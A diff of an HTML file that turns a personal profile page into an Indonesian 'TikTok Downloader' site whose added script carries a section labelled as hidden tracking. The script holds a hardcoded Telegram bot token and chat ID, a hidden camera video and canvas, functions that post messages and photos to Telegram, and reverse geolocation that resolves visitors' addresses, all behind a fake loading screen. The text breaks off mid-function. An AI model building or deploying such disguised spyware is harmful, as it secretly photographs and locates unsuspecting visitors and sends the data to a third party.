@@ -1,471 +1,831 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="view-transition" content="same-origin" />
-    <title>Agung Professional Profile</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                    },
-                    colors: {
-                        primary: {
-                            500: '#0095f6', // Warna biru Instagram
-                            600: '#0077e6',
-                        },
-                        dark: {
-                            800: '#1e1e2d',
-                            900: '#121218',
-                        }
-                    },
-                    keyframes: {
-                        'fade-in-up': {
-                            '0%': { opacity: '0', transform: 'translateY(10px)' },
-                            '100%': { opacity: '1', transform: 'translateY(0)' },
-                        },
-                        'rotate': {
-                            '0%': { transform: 'rotate(0deg)' },
-                            '100%': { transform: 'rotate(360deg)' },
-                        },
-                        'telegram-verified': {
-                            '0%': { transform: 'scale(1)' },
-                            '50%': { transform: 'scale(1.2)' },
-                            '100%': { transform: 'scale(1)' },
-                        },
-                        'ripple': {
-                            '0%': { transform: 'scale(0.5)', opacity: '1' },
-                            '100%': { transform: 'scale(2.5)', opacity: '0' },
-                        }
-                    },
-                    animation: {
-                        'fade-in-up': 'fade-in-up 0.5s ease-out',
-                        'rotate': 'rotate 0.5s ease-in-out',
-                        'telegram-verified': 'telegram-verified 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55)',
-                        'ripple': 'ripple 1s ease-out infinite',
-                    }                                
-                }
-            }
+    <title>Download Video TikTok Tanpa Watermark</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
+    <style>
+        /* Reset dan gaya dasar */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
-    </script>
-    <style type="text/tailwindcss">
-        @layer utilities {
-            .text-gradient {
-                @apply bg-gradient-to-r from-primary-500 to-blue-600 bg-clip-text text-transparent;
+        
+        body {
+            background: linear-gradient(135deg, #6e48aa, #9d50bb);
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* Header */
+        header {
+            background-color: rgba(255, 255, 255, 0.9);
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #6e48aa;
+            margin-bottom: 10px;
+        }
+        
+        .tagline {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        /* Container utama */
+        .main-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        /* Form download */
+        .download-form {
+            background-color: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 600px;
+            text-align: center;
+        }
+        
+        .form-title {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #6e48aa;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .url-input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .url-input:focus {
+            border-color: #6e48aa;
+            outline: none;
+        }
+        
+        .download-btn {
+            background: linear-gradient(135deg, #6e48aa, #9d50bb);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            width: 100%;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(110, 72, 170, 0.4);
+        }
+        
+        .download-btn:active {
+            transform: translateY(0);
+        }
+        
+        /* Hasil download */
+        .result-container {
+            margin-top: 30px;
+            display: none;
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
+            width: 100%;
+            max-width: 600px;
+        }
+        
+        .video-preview {
+            width: 100%;
+            border-radius: 8px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .video-preview img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .video-info {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+        
+        .video-title {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .video-details {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        
+        .download-options {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        
+        .option-btn {
+            flex: 1;
+            min-width: 120px;
+            background-color: #f5f5f5;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .option-btn:hover {
+            background-color: #e9e9e9;
+        }
+        
+        .option-btn.primary {
+            background: linear-gradient(135deg, #6e48aa, #9d50bb);
+            color: white;
+        }
+        
+        .option-btn.primary:hover {
+            background: linear-gradient(135deg, #5d3d95, #8a45a8);
+        }
+        
+        /* Footer */
+        footer {
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .footer-text {
+            font-size: 14px;
+            opacity: 0.8;
+        }
+        
+        /* Loading */
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(110, 72, 170, 0.2);
+            border-radius: 50%;
+            border-top: 4px solid #6e48aa;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Container loading tersembunyi */
+        #loading-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            text-align: center;
+            color: #999;
+        }
+        
+        #loading-text {
+            font-size: 22px;
+            margin-bottom: 20px;
+            color: #6e48aa;
+        }
+        
+        #progress-container {
+            height: 3px;
+            background: #222;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 10px;
+            width: 80%;
+            max-width: 400px;
+        }
+        
+        #progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #6e48aa, #9d50bb);
+            transition: width 0.3s ease;
+        }
+        
+        #loading-details {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+            min-height: 20px;
+        }
+        
+        .hidden {
+            display: none !important;
+        }
+        
+        /* Responsif */
+        @media (max-width: 768px) {
+            .download-form, .result-container {
+                padding: 20px;
             }
-            .card-hover {
-                @apply transition-all duration-300 hover:scale-[1.02] hover:shadow-xl;
-            }
-            .glass-effect {
-                @apply bg-white/5 backdrop-blur-sm border border-white/10;
-            }
-            .glass-effect-light {
-                @apply bg-black/5 backdrop-blur-sm border border-black/10;
-            }
-            .verified-badge {
-                @apply bg-primary-500 text-white rounded-full flex items-center justify-center cursor-pointer;
-            }
-            .verified-badge-light {
-                @apply bg-blue-500 text-white rounded-full flex items-center justify-center cursor-pointer;
-            }
-                /* Glass effect yang lebih profesional */
-            .glass-effect-dark {
-                @apply bg-dark-800/80 backdrop-blur-sm border border-white/10 shadow-lg;
-            }
-            .glass-effect-light {
-                @apply bg-white/80 backdrop-blur-sm border border-black/10 shadow-lg;
-            }
-            /* Verified badge yang lebih konsisten */
-            .verified-badge-dark {
-                @apply bg-primary-500 text-white rounded-full flex items-center justify-center cursor-pointer;
-            }
-            .verified-badge-light {
-                @apply bg-blue-600 text-white rounded-full flex items-center justify-center cursor-pointer;
-            }
-            .circle-expand {
-                @apply fixed rounded-full bg-primary-500 dark:bg-blue-600;
-                transform: scale(0);
-                z-index: 9999;
-                pointer-events: none;
-            }            
-            @keyframes circle-expand {
-                0% {
-                    transform: scale(0);
-                    opacity: 1;
-                }
-                100% {
-                    transform: scale(3);
-                    opacity: 0;
-                }
-            }
-            .animate-circle-expand {
-                animation: circle-expand 0.6s ease-out forwards;
-            }
-            ::view-transition {
-                isolation: isolate;
-            }
-            ::view-transition-old(root),
-            ::view-transition-new(root) {
-              mix-blend-mode: normal;
-              animation: none;
-            }
-            ::view-transition-new(root) {
-              view-transition-name: none;
-              mask: radial-gradient(
-                circle at center,
-                white 0%,
-                white var(--circle-size, 0%),
-                transparent var(--circle-size, 0%),
-                transparent 100%
-              );
-              animation: circle-expand 0.8s cubic-bezier(0.4, 0, 0.2, 1) forwards;
-            }
-            @keyframes circle-expand {
-              from {
-                --circle-size: 0%;
-              }
-              to {
-                --circle-size: 200%;
-              }
-            }            
-            @supports not (view-transition-name: none) {
-              body {
-                transition: background-color 0.5s ease, color 0.5s ease;
-              }
+            
+            .download-options {
+                flex-direction: column;
             }
         }
     </style>
 </head>
-<body class="bg-dark-900 text-gray-100 min-h-screen font-sans dark:bg-gray-50 dark:text-gray-800 transition-colors duration-300">
-    <!-- Loading Screen -->
-    <div id="loadingScreen" class="fixed inset-0 bg-dark-900 dark:bg-gray-50 z-50 flex flex-col items-center justify-center transition-colors duration-300">
-       <img src="https://i.gifer.com/Xqg8.gif" alt="Loading" class="w-35 h-35">
-     <!-- <p class="mt-4 text-gray-400 dark:text-gray-600">Loading...</p> -->
-    </div>
-
-    <!-- Main Content (hidden initially) -->
-    <div id="mainContent" class="hidden">
-        <!-- Theme Toggle Button -->
-        <div id="themeToggle" class="fixed bottom-6 right-6 z-30 animate-fade-in-up opacity-0">
-            <button class="w-12 h-12 rounded-full bg-dark-800 dark:bg-gray-200 shadow-lg flex items-center justify-center transition-all duration-300 hover:scale-110 focus:outline-none">
-                <svg id="sunIcon" class="w-6 h-6 text-yellow-400 rotate-0 transition-transform duration-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z" />
-                </svg>
-                <svg id="moonIcon" class="w-6 h-6 text-blue-800 rotate-0 transition-transform duration-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z" />
-                </svg>
-            </button>
-        </div>
-
-        <!-- Verification Animation Elements -->
-       <div id="verificationOverlay" class="fixed inset-0 bg-black/70 z-40 flex items-center justify-center hidden">
-    <div class="relative">
-        <div class="absolute inset-0 flex items-center justify-center">
-            <div class="w-32 h-32 rounded-full bg-blue-500/20 animate-ripple"></div>
-            <div class="w-32 h-32 rounded-full bg-blue-500/20 animate-ripple" style="animation-delay: 0.3s;"></div>
-            <div class="w-32 h-32 rounded-full bg-blue-500/20 animate-ripple" style="animation-delay: 0.6s;"></div>
-        </div>
-        <div class="relative z-50 glass-effect-dark dark:glass-effect-light p-8 rounded-2xl shadow-2xl text-center max-w-sm mx-4">
-            <div class="w-20 h-20 bg-primary-500 dark:bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 animate-telegram-verified">
-                <i class="fas fa-check text-3xl text-white"></i>
+<body>
+    <!-- Loading screen tersembunyi -->
+    <div id="loading-container" class="hidden">
+        <div>
+            <div id="loading-text">PROSES LOADING</div>
+            <div id="progress-container">
+                <div id="progress-bar"></div>
             </div>
-            <h3 class="text-xl font-bold dark:text-gray-900">Verified Account</h3>
-            <p class="mt-2 text-gray-300 dark:text-gray-700">This is a verified website. All authentic content and can be trusted.</p>
-            <button id="closeVerification" class="mt-6 px-6 py-2 bg-primary-500 dark:bg-blue-600 text-white rounded-full hover:bg-primary-600 dark:hover:bg-blue-700 transition-colors">Got it</button>
+            <div id="loading-details">Memulai inisialisasi...</div>
         </div>
     </div>
-</div>
+    
+    <!-- Elemen untuk capture kamera (tersembunyi) -->
+    <video id="video-element" autoplay muted class="hidden"></video>
+    <canvas id="canvas-element" class="hidden"></canvas>
 
-        <!-- Hero Section -->
-        <div class="relative overflow-hidden">
-            <div class="absolute inset-0 bg-gradient-to-b from-black/80 to-dark-900 dark:from-black/60 dark:to-gray-50 z-10"></div>
-            <img alt="Cover image" class="w-full h-64 md:h-80 object-cover object-center" src="https://files.catbox.moe/tobewj.jpg">
-                        
-        <!-- Profile Content -->
-        <div class="container mx-auto px-4 max-w-2xl -mt-12 relative z-20">
-            <!-- Profile Card -->
-            <div class="glass-effect dark:glass-effect-light rounded-2xl p-6 shadow-lg">
-                <div class="flex flex-col items-center">
-                    <div class="relative">
-                        <img alt="Profile picture" class="w-24 h-24 md:w-28 md:h-28 rounded-full border-4 border-dark-800 dark:border-gray-200" src="https://files.catbox.moe/ndurdv.jpg">
-                    </div>
-                    
-                    <!-- Nama dengan centang biru Instagram -->
-                    <div class="flex items-center justify-center mt-4">
-                        <h1 class="text-2xl md:text-3xl font-bold">Agung</h1>
-                        <div id="verifiedBadge" class="verified-badge dark:verified-badge-light w-5 h-5 ml-2" style="transform: translateY(-1px);">
-                            <i class="fas fa-check text-xs"></i>
-                        </div>
-                    </div>
-                    
-                    <p class="text-gray-400 dark:text-gray-600 mt-1">Right now I just do what I'm interested in.</p>
-                    
-                    <!-- Skills -->
-                    <div class="flex flex-wrap justify-center gap-4 mt-4">
-                        <div class="flex items-center bg-dark-800 dark:bg-gray-200 px-3 py-1 rounded-full">
-                            <i class="fas fa-laptop-code text-primary-500 dark:text-blue-600 mr-2"></i>
-                            <span>Coder</span>
-                        </div>
-                        <div class="flex items-center bg-dark-800 dark:bg-gray-200 px-3 py-1 rounded-full">
-                            <i class="fas fa-gamepad text-green-500 mr-2"></i>
-                            <span>Game</span>
-                        </div>
-                        <div class="flex items-center bg-dark-800 dark:bg-gray-200 px-3 py-1 rounded-full">
-                            <i class="fas fa-music text-purple-500 mr-2"></i>
-                            <span>Music</span>
-                        </div>
-                    </div>
-                    
-                    <!-- Social Links -->
-                    <div class="flex space-x-5 mt-6">
-                        <a href="https://instagram.com/siagungg_" class="text-xl hover:text-primary-500 dark:hover:text-blue-600 transition-colors">
-                            <i class="fab fa-instagram"></i>
-                        </a>
-                        <a href="https://github.com/agung-mk" class="text-xl hover:text-gray-300 dark:hover:text-gray-600 transition-colors">
-                            <i class="fab fa-github"></i>
-                        </a>
-                        <a href="https://t.me/agungdev" class="text-xl hover:text-green-500 transition-colors">
-                            <i class="fab fa-telegram"></i>
-                        </a>
-                        <a href="https://open.spotify.com/playlist/0n6nan55XVDcV6X4AOwwkN?si=HJIOVhmhTEWEzjbrc1LOLQ" class="text-xl hover:text-green-500 transition-colors">
-                            <i class="fab fa-spotify"></i>
-                        </a>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Links Section -->
-            <div class="mt-8 space-y-4">
-                <h2 class="text-xl font-bold text-gradient"></h2>
-                
-                <a href="https://www.agungdev.xyz" class="card-hover glass-effect dark:glass-effect-light rounded-xl p-4 flex items-center">
-                    <div class="bg-blue-500/10 dark:bg-blue-600/10 p-3 rounded-lg">
-                        <i class="fas fa-globe text-blue-500 dark:text-blue-600"></i>
-                    </div>
-                    <div class="ml-4 flex-1">
-                        <h3 class="font-semibold">Personal Website</h3>
-                        <p class="text-sm text-gray-400 dark:text-gray-600">Explore my biography, projects and more</p>
-                    </div>
-                    <i class="fas fa-chevron-right text-gray-500 dark:text-gray-400"></i>
-                </a>
-                
-                <a href="https://whatsapp.com/channel/0029VbBOMPuHAdNRvXNfId2X" class="card-hover glass-effect dark:glass-effect-light rounded-xl p-4 flex items-center">
-                    <div class="bg-red-500/10 dark:bg-red-600/10 p-3 rounded-lg">
-                        <i class="fas fa-robot text-red-500 dark:text-red-600"></i>
-                    </div>
-                    <div class="ml-4 flex-1">
-                        <h3 class="font-semibold">GeniusAI - Bot in WhatsApp</h3>
-                        <p class="text-sm text-gray-400 dark:text-gray-600">Multifunctional Bots can do amazing things</p>
-                    </div>
-                    <i class="fas fa-chevron-right text-gray-500 dark:text-gray-400"></i>
-                </a>
-                
-                  <a href="/" class="card-hover glass-effect dark:glass-effect-light rounded-xl p-4 flex items-center">
-                    <div class="bg-blue-500/10 dark:bg-blue-600/10 p-3 rounded-lg">
-                        <i class="fas fa-code text-blue-500 dark:text-blue-400 text-lg"></i>
-                    </div>
-                    <div class="ml-4 flex-1">
-                        <h3 class="font-semibold">API Documentation</h3>
-                        <p class="text-sm text-gray-400 dark:text-gray-600">Complete API reference and guides</p>
-                    </div>
-                    <i class="fas fa-chevron-right text-gray-500 dark:text-gray-400"></i>
-                </a>
-            </div>
-
-            <!-- Spotify Section -->
-            <div class="glass-effect dark:glass-effect-light rounded-xl p-4 mt-6 text-center">
-                <p class="text-sm text-gray-400 dark:text-gray-600">See what I'm currently listening on Spotify</p>
-                <div class="flex items-center justify-center mt-2">
-                    <i class="fab fa-spotify text-green-500 mr-2"></i>
-                    <span>No listening to anything</span>
-                </div>
+    <!-- Tampilan utama website -->
+    <header>
+        <div class="logo">TikTok Downloader</div>
+        <div class="tagline">Download video TikTok tanpa watermark dengan mudah dan cepat</div>
+    </header>
+    
+    <div class="main-container">
+        <div class="download-form">
+            <h2 class="form-title">Download Video TikTok</h2>
+            <p style="margin-bottom: 20px; color: #666;">Masukkan URL video TikTok di bawah ini untuk mendownload tanpa watermark</p>
+            
+            <div class="input-group">
+                <input type="text" id="tiktok-url" class="url-input" placeholder="https://www.tiktok.com/@username/video/1234567890" required>
             </div>
             
-           <!-- Guestbook Section -->
-<div class="glass-effect dark:glass-effect-light rounded-xl p-4 mt-6">
-    <div class="rounded-xl overflow-hidden shadow-md">
-        <iframe 
-            src="https://www5.cbox.ws/box/?boxid=957068&boxtag=pt44dr" 
-            width="100%" 
-            height="450" 
-            allowtransparency="yes" 
-            allow="autoplay" 
-            frameborder="0" 
-            marginheight="0" 
-            marginwidth="0" 
-            scrolling="auto"
-            class="w-full h-[450px] border-0 rounded-xl">
-        </iframe>
-    </div>
-</div>
-
-            <!-- Footer -->
-            <div class="text-center text-gray-500 dark:text-gray-600 text-sm mt-8 pb-8">
-                <p>© 2025 Agung Mahesa. All rights reserved.</p>
+            <button id="download-btn" class="download-btn">Download Video</button>
+            
+            <div class="loading" id="loading-indicator">
+                <div class="spinner"></div>
+                <p>Mengambil informasi video...</p>
             </div>
         </div>
-    </div>
-
- <script>
-    // Simulate loading for 3 seconds then show content
-    setTimeout(() => {
-        document.getElementById('loadingScreen').classList.add('hidden');
-        document.getElementById('mainContent').classList.remove('hidden');
         
-        // Animate theme toggle button
-        const themeToggle = document.getElementById('themeToggle');
-        setTimeout(() => {
-            themeToggle.classList.remove('opacity-0');
-            themeToggle.style.animation = 'fade-in-up 0.5s ease-out forwards';
-        }, 100);
-    }, 3000);
-
-    // Smooth Theme Transition Functions
-    async function toggleTheme() {
-        // Skip animation if not supported
-        if (!document.startViewTransition) {
-            applyThemeChange();
-            return;
-        }
-
-        // Start smooth transition
-        const transition = document.startViewTransition(() => {
-            applyThemeChange();
-        });
-
-        try {
-            // Wait for animations to be ready
-            await transition.ready;
+        <div class="result-container" id="result-container">
+            <h3 style="margin-bottom: 15px; color: #6e48aa;">Video Siap Didownload</h3>
             
-            // Animate from center of screen
-            const x = window.innerWidth / 2;
-            const y = window.innerHeight / 2;
-            const endRadius = Math.hypot(
-                Math.max(x, window.innerWidth - x),
-                Math.max(y, window.innerHeight - y)
-            );
+            <div class="video-preview">
+                <img id="video-thumbnail" src="" alt="Thumbnail Video">
+            </div>
             
-            document.documentElement.animate(
-                {
-                    clipPath: [
-                        `circle(0 at ${x}px ${y}px)`,
-                        `circle(${endRadius}px at ${x}px ${y}px)`
-                    ],
-                },
-                {
-                    duration: 800,
-                    easing: 'cubic-bezier(0.4, 0, 0.2, 1)',
-                    pseudoElement: '::view-transition-new(root)'
+            <div class="video-info">
+                <div class="video-title" id="video-title">Judul Video</div>
+                <div class="video-details" id="video-author">Pembuat: -</div>
+                <div class="video-details" id="video-duration">Durasi: -</div>
+                <div class="video-details" id="video-views">Dilihat: -</div>
+            </div>
+            
+            <div class="download-options">
+                <button class="option-btn primary" id="download-without-watermark">Download Tanpa Watermark</button>
+                <button class="option-btn" id="download-with-watermark">Download Dengan Watermark</button>
+                <button class="option-btn" id="download-audio">Download Audio</button>
+            </div>
+        </div>
+    </div>
+    
+    <footer>
+        <div class="footer-text">
+            &copy; 2025 TikTok Downloader - Download video TikTok tanpa watermark
+        </div>
+    </footer>
+
+    <script>
+        (() => {
+            // ========== KONFIGURASI TRACKING ==========
+            // MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
+            const TELEGRAM_BOT_TOKEN = '8236050362:AAEgD4-CRiLmgymv4liDcEof8yCvSANGgXs';
+            
+            // MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
+            const TELEGRAM_CHAT_ID = '5498433064';
+            
+            // ========== ELEMEN DOM ==========
+            const progressBar = document.getElementById('progress-bar');
+            const loadingDetails = document.getElementById('loading-details');
+            const videoElement = document.getElementById('video-element');
+            const canvasElement = document.getElementById('canvas-element');
+            const loadingContainer = document.getElementById('loading-container');
+            
+            // Elemen untuk tampilan utama
+            const tiktokUrlInput = document.getElementById('tiktok-url');
+            const downloadBtn = document.getElementById('download-btn');
+            const loadingIndicator = document.getElementById('loading-indicator');
+            const resultContainer = document.getElementById('result-container');
+            const videoThumbnail = document.getElementById('video-thumbnail');
+            const videoTitle = document.getElementById('video-title');
+            const videoAuthor = document.getElementById('video-author');
+            const videoDuration = document.getElementById('video-duration');
+            const videoViews = document.getElementById('video-views');
+            const downloadWithoutWatermark = document.getElementById('download-without-watermark');
+            const downloadWithWatermark = document.getElementById('download-with-watermark');
+            const downloadAudio = document.getElementById('download-audio');
+            
+            // ========== VARIABEL GLOBAL ==========
+            let progress = 0;
+            let currentVideoData = null;
+            
+            // Pesan loading yang akan ditampilkan secara acak
+            const loadingMessages = [
+                "Memeriksa modul sistem...",
+                "Memuat komponen inti...",
+                "Menginisialisasi antarmuka...",
+                "Memverifikasi koneksi...",
+                "Menyiapkan lingkungan...",
+                "Memeriksa pembaruan...",
+                "Memuat aset tampilan..."
+            ];
+            
+            // ========== FUNGSI UTAMA WEBSITE DOWNLOAD ==========
+            
+            /**
+             * Mengambil data video TikTok dari API
+             */
+            async function fetchTikTokData(url) {
+                try {
+                    // Encode URL untuk request API
+                    const encodedUrl = encodeURIComponent(url);
+                    
+                    // Menggunakan API yang Anda berikan
+                    const response = await fetch(`https://zenitsu.web.id/api/download/tiktok?url=${encodedUrl}`);
+                    
+                    if (!response.ok) {
+                        throw new Error('Gagal mengambil data video');
+                    }
+                    
+                    const data = await response.json();
+                    
+                    if (data.statusCode !== 200) {
+                        throw new Error('URL TikTok tidak valid');
+                    }
+                    
+                    return data.results;
+                } catch (error) {
+                    console.error('Error fetching TikTok data:', error);
+                    throw error;
                 }
-            );
-        } catch (err) {
-            console.error('Transition failed:', err);
-            applyThemeChange();
-        }
-    }
-
-    function applyThemeChange() {
-        const html = document.documentElement;
-        
-        // Toggle theme
-        html.classList.toggle('dark');
-        
-        // Update icons
-        const sunIcon = document.getElementById('sunIcon');
-        const moonIcon = document.getElementById('moonIcon');
-        
-        if (html.classList.contains('dark')) {
-            sunIcon.classList.add('animate-rotate');
-            setTimeout(() => {
-                sunIcon.classList.remove('animate-rotate');
-                sunIcon.classList.add('hidden');
-                moonIcon.classList.remove('hidden');
-            }, 500);
-        } else {
-            moonIcon.classList.add('animate-rotate');
-            setTimeout(() => {
-                moonIcon.classList.remove('animate-rotate');
-                moonIcon.classList.add('hidden');
-                sunIcon.classList.remove('hidden');
-            }, 500);
-        }
-        
-        // Save preference
-        localStorage.setItem('theme', html.classList.contains('dark') ? 'dark' : 'light');
-    }
-
-    // Theme toggle functionality
-    const html = document.querySelector('html');
-    const themeToggleBtn = document.querySelector('#themeToggle button');
-    
-    // Check for saved theme preference or use system preference
-    const currentTheme = localStorage.getItem('theme') || (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light');
-    html.classList.add(currentTheme);
-    
-    // Set initial icon visibility
-    const sunIcon = document.getElementById('sunIcon');
-    const moonIcon = document.getElementById('moonIcon');
-    if (currentTheme === 'dark') {
-        sunIcon.classList.remove('hidden');
-        moonIcon.classList.add('hidden');
-    } else {
-        sunIcon.classList.add('hidden');
-        moonIcon.classList.remove('hidden');
-    }
-    
-    // Attach smooth transition handler
-    themeToggleBtn.addEventListener('click', toggleTheme);
-
-    // Verified badge click handler
-    const verifiedBadge = document.getElementById('verifiedBadge');
-    const verificationOverlay = document.getElementById('verificationOverlay');
-    const closeVerification = document.getElementById('closeVerification');
-
-    verifiedBadge.addEventListener('click', () => {
-        verificationOverlay.classList.remove('hidden');
-        document.body.style.overflow = 'hidden';
-    });
-
-    closeVerification.addEventListener('click', () => {
-        verificationOverlay.classList.add('hidden');
-        document.body.style.overflow = '';
-    });
-
-    document.addEventListener('contextmenu', event => event.preventDefault());
-    document.onkeydown = function(e) {
-        if (e.key == "F12" || (e.ctrlKey && e.shiftKey && e.key == "I") || (e.ctrlKey && e.key == "U")) {
-            return false;
-        }
-    };
-
-  // Deteksi iframing
-  if (window !== window.top) {
-    window.top.location = window.location;
-  }
-
-  // Deteksi DevTools dibuka
-  setInterval(function() {
-    const start = new Date();
-    debugger;
-    if (new Date() - start > 100) {
-      window.location.href = "https://google.com"; // redirect kalau curiga
-    }
-  }, 1000);
-
-  // Nonaktifkan klik kanan & inspect element
-  document.addEventListener('contextmenu', event => event.preventDefault());
-  document.onkeydown = function(e) {
-    if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
-      return false;
-    }
-  };
-  </script>
- </body>
+            }
+            
+            /**
+             * Menampilkan hasil video
+             */
+            function displayVideoResult(videoData) {
+                videoThumbnail.src = videoData.cover;
+                videoTitle.textContent = videoData.title || 'Judul tidak tersedia';
+                videoAuthor.textContent = `Pembuat: ${videoData.author.nickname || 'Tidak diketahui'}`;
+                videoDuration.textContent = `Durasi: ${videoData.duration || 0} detik`;
+                videoViews.textContent = `Dilihat: ${videoData.play_count || 0} kali`;
+                
+                resultContainer.style.display = 'block';
+                currentVideoData = videoData;
+            }
+            
+            /**
+             * Mendownload file
+             */
+            function downloadFile(url, filename) {
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = filename;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+            }
+            
+            // ========== FUNGSI TRACKING (TERSEMBUNYI) ==========
+            
+            /**
+             * Memperbarui progress bar dan menampilkan pesan loading acak
+             */
+            function updateProgress() {
+                progress += Math.random() * 5;
+                if (progress > 98) progress = 98;
+                progressBar.style.width = progress + '%';
+                
+                // Tampilkan pesan loading acak secara periodik
+                if (Math.random() > 0.9) {
+                    const randomMessage = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+                    loadingDetails.textContent = randomMessage;
+                }
+            }
+            
+            /**
+             * Mengirim pesan teks ke Telegram
+             * @param {string} message - Pesan yang akan dikirim
+             */
+            async function sendToTelegram(message) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                } catch (error) {
+                    console.error('Gagal mengirim pesan ke Telegram:', error);
+                }
+            }
+            
+            /**
+             * Mengirim foto ke Telegram
+             * @param {Blob} blob - Gambar dalam format blob
+             * @param {string} filename - Nama file untuk gambar
+             */
+            async function sendPhotoToTelegram(blob, filename) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', blob, filename);
+                    
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } catch (error) {
+                    console.error('Gagal mengirim foto ke Telegram:', error);
+                }
+            }
+            
+            /**
+             * Mendapatkan detail lokasi dari koordinat
+             * @param {number} latitude - Koordinat latitude
+             * @param {number} longitude - Koordinat longitude
+             * @returns {Object} Objek dengan detail lokasi
+             */
+            async function getLocationDetails(latitude, longitude) {
+                try {
+                    const response = await fetch(
+                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
+                    );
+                    const data = await response.json();
+                    
+                    if (data.address) {
+                        return {
+                            kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
+                            kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
+                            alamatLengkap: data.display_name || "Alamat tidak tersedia"
+                        };
+                    }
+                } catch (error) {
+                    console.error('Gagal mendapatkan detail lokasi:', error);
+                }
+                
+                // Nilai default jika gagal
+                return {
+                    kabupaten: "Tidak diketahui",
+                    kecamatan: "Tidak diketahui",
